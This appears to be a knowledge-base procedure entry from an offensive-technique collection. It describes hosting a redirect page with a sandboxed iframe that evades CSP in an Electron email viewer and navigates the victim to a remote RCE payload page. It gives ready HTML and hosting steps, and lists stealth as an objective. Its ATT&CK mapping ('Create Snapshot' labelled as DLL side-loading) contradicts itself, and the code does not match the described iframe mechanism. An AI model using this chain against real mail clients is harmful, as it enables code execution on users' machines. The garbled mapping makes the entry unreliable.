---
id: proc-uuid-004
tags:
  - iframe-bypass
  - redirect
  - csp-evasion
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[Create Snapshot]]'
updated_at: '2025-12-13T23:55:20.593Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Create Snapshot]]'
---
# Host Redirect for Iframe Bypass

## Summary

This procedure hosts a redirect page using an iframe with sandbox attributes to bypass external domain restrictions and chain to the RCE payload, enabling top-level navigation from the XSS context.

## Description

To evade CSP and browser same-origin policies in the email viewer, host redirect.html on one domain that loads an iframe sourcing RCE.html from another, using sandbox='allow-top-navigation' to redirect the top window. This tricks the Electron app into loading the RCE script. Outcome: Chained navigation to RCE.

## Requirements

1. Control over two external domains for hosting
2. Web server (e.g., Apache, nginx) to serve HTML files
3. HTTPS preferred to avoid mixed content blocks

## Defense

Defensive measures and detection strategies:

- Block sandboxed iframes in email renderers
- Restrict top-navigation in CSP for email contexts
- Scan for suspicious redirects from email-linked domains

## Objectives

1. Bypass domain restrictions via iframe
2. Enable cross-domain RCE chaining
3. Maintain stealth in navigation

## Instructions

### Step 1: Create redirect.html

**Context**: Build the redirect facilitator.

Write:
```html
<!DOCTYPE html>
<html><body><script>window.top.location.href='https://rce-domain.com/RCE.html';</script><iframe sandbox="allow-top-navigation" src="https://rce-domain.com/RCE.html"></iframe></body></html>
```

### Step 2: Host and Verify

**Context**: Deploy and test.

Upload to server at http://redirect-domain.com/redirect.html. Load in browser to confirm redirect.

**Expected Output**: Automatic redirect to RCE.html.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Create Snapshot]] Hijack Execution Flow: DLL Side-Loading

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- iframe-bypass
- redirect
- csp-evasion
